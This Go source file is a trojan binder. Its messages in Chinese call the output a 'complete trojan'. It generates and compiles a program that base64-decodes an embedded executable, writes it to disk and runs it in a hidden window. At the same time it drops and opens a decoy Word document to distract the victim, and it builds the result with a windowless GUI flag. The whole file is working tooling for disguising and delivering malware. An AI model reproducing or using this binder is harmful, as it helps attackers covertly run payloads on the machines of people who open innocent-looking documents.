package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

func binding(word, outword, exe, exeout, key, output, path string) {
	exeoutpath := strings.Replace(exeout, "\\", "\\\\", -1)
	var outexe = `
package main

import (
	"encoding/base64"
	"os"
	"os/exec"
	"syscall"
)

func main() {
	filename := "` + exeoutpath + `"
	readfile(filename)
	cmdOpen := exec.Command(filename, "` + key + `")
	cmdOpen.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}
	cmdOpen.Start()
	word("` + outword + ".docx" + `")
}
func readfile(filename string) {
	file := "` + exe + `"
	decoded, _ := base64.StdEncoding.DecodeString(file)
	decodestr := string(decoded)
	ok, _ := os.OpenFile(filename, os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0600)
	defer ok.Close()
	ok.Write([]byte(decodestr))
}

func word(wofilename string) {
	filename := wofilename
	base64file := "` + word + `"
	decoded, _ := base64.StdEncoding.DecodeString(base64file)
	decodestr := string(decoded)
	ok, _ := os.OpenFile(filename, os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0600)
	defer ok.Close()
	ok.Write([]byte(decodestr))
	exec.Command("cmd.exe", "/c", "start", filename)
	cmdOpen := exec.Command("cmd.exe", "/c", "start", filename)
	cmdOpen.Start()
}
`
	ok, err := os.OpenFile("ok.go", os.O_WRONLY|os.O_CREATE, 0600)
	if err != nil {
		fmt.Println("打开ok.go文件失败")
	}
	defer ok.Close()
	i, err1 := ok.Write([]byte(outexe))
	if err1 != nil {
		fmt.Println("写入ok.go文件失败")
	} else {
		batfile, _ := os.OpenFile("build.bat", os.O_WRONLY|os.O_CREATE, 0600)
		_, _ = batfile.Write([]byte("go build -ldflags=\"-H windowsgui\" -o " + output + ".exe ok.go"))
		batfile.Close()
		fmt.Println("写入大小:", i)
		fmt.Print("编译完整马-- ")
		build := exec.Command(filepath.Dir(path) + "\\build.bat")
		comerr := build.Run()
		if comerr != nil {
			fmt.Println(comerr)
		}
		fmt.Println("编译完整马完成:" + output + ".exe")
	}
}
